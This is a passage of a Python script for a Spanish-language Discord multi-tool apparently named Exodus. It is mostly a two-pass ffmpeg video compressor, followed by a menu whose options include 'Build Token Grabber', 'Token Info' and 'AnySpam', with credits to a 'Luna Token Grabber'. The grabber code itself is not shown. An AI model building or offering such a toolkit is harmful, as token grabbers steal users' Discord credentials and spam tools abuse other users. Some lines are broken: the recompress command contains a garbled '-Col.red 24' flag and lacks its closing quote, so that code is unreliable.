                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 121:
            bitrate -= 64
            if height >= 480:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:480 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:480 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 181:
            bitrate -= 48
            if height >= 480:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:480 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:480 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 48k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 48k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 301:
            bitrate -= 32
            if height >= 320:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:320 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:320 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 32k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 32k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 421:
            bitrate -= 24
            if height >= 240:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:240 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:240 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 24k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 24k \"{script_folder}Compress\\{output_video}.webm\"")
        else:
            bitrate -= 12
            if height >= 144:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:144 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=-1:144 -b:v {bitrate}k -pass 2 -c:a libopus -ac 1 -b:a 12k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -ac 1 -b:a 12k \"{script_folder}Compress\\{output_video}.webm\"")
    else:
        if duration < 31:
            bitrate -= 128
            if width >= 1080:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=1080:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=1080:-1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 128k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 128k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 61:
            bitrate -= 96
            if width >= 720:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=720:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -vf scale=720:-1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 96k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 96k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 91:
            bitrate -= 64
            if width >= 720:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=720:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=720:-1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 121:
            bitrate -= 64
            if width >= 480:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=480:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=480:-1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 64k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 181:
            bitrate -= 48
            if width >= 480:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=480:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=480:-1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 48k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 48k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 301:
            bitrate -= 32
            if width >= 320:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=320:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=320:-1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 32k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 32k \"{script_folder}Compress\\{output_video}.webm\"")
        elif duration < 421:
            bitrate -= 24
            if width >= 240:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=240:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=240:-1 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 24k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -b:a 24k \"{script_folder}Compress\\{output_video}.webm\"")
        else:
            bitrate -= 12
            if width >= 144:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=144:-1 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -vf scale=144:-1 -b:v {bitrate}k -pass 2 -c:a libopus -ac 1 -b:a 12k \"{script_folder}Compress\\{output_video}.webm\"")
            else:
                system(f"ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 1 -an -y -f null NUL && ^ffmpeg -hide_banner -loglevel warning -stats -i \"{input_video}\" -c:v libvpx-vp9 -pix_fmt yuv420p -cpu-used 3 -row-mt 1 -fpsmax 30 -b:v {bitrate}k -pass 2 -c:a libopus -ac 1 -b:a 12k \"{script_folder}Compress\\{output_video}.webm\"")
    
    if path.isfile("temp.json") == True:
        remove("temp.json")
    if path.isfile("ffmpeg2pass-0.log") == True:
        remove("ffmpeg2pass-0.log")
        System.Clear()
        p(Colorate.Vertical(Colors.DynamicMIX((Col.red, Col.purple)), (O5)))
    
    recompress = i(f" {Col.purple}[{Col.red}*{Col.purple}] Deseas recomprimir el archivo? {Col.white}[y/n]: {Col.red}> {Col.white}")
    if recompress == "y" or recompress == "Y":
        system(f"ffmpeg -fflags +genpts -hide_banner -loglevel warning -stats -i \"{input_video}\" -Col.red 24 \"{script_folder}Compress\\ReCompress-{output_video}.mp4")
        i(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Presiona enter para continuar...")

def Credits():
    System.Clear()
    System.Title("End. . . . ")
    slow(f"""{Col.purple}
    Credits to Smug246 for Luna Token Grabber
    Creditos a Smug246 por Luna Token Grabber
{Col.white}
""")
    i(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Presiona enter para salir..." + exit)

class Exodus:
    StatusConnection(), install()
    while True:
        System.Title(f"Exodus  ^|  Welcome: {OX}")
        System.Clear()
        B1 = fr"""
             ▄▀▀█▄▄▄▄  ▄▀▀▄  ▄▀▄  ▄▀▀▀▀▄   ▄▀▀█▄▄   ▄▀▀▄ ▄▀▀▄  ▄▀▀▀▀▄ 
            ▐  ▄▀   ▐ █    █   █ █      █ █ ▄▀   █ █   █    █ █ █   ▐ 
              █▄▄▄▄▄  ▐     ▀▄▀  █      █ ▐ █    █ ▐  █    █     ▀▄   
              █    ▌       ▄▀ █  ▀▄    ▄▀   █    █   █    █   ▀▄   █  
             ▄▀▄▄▄▄       █  ▄▀    ▀▀▀▀    ▄▀▄▄▄▄▀    ▀▄▄▄▄▀   █▀▀▀   
             █    ▐     ▄▀  ▄▀            █     ▐              ▐      
             ▐         █    ▐             ▐                                                           
            ╭─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─╮
              [1] MSN                   
              [2] Build Token Grabber      
              [3] Discord Invite                 
              [4] Token Info                
              [5] AnySpam                                       [X] Credits
              [6] Video Compressor                              [0] Exit 
            ╰─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─╯                   
            """[1:]
        p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (B1)))
        p()
        CH1 = i(f" {Col.purple}[{Col.red}*{Col.purple}] Choice {Col.red}> {Col.white}")
        if CH1 == '1':
            MSN()
        if CH1 == '2':
            BDTG()
        if CH1 == '3':
            DiscordInvite()
        if CH1 == '4':
            DTI()
        if CH1 == '5':
            AnySpam()
        if CH1 == '6':
            XCSS()
        if CH1 == 'x' or CH1.upper() == 'X':
            Credits()
        if CH1 == '0':
            exit()
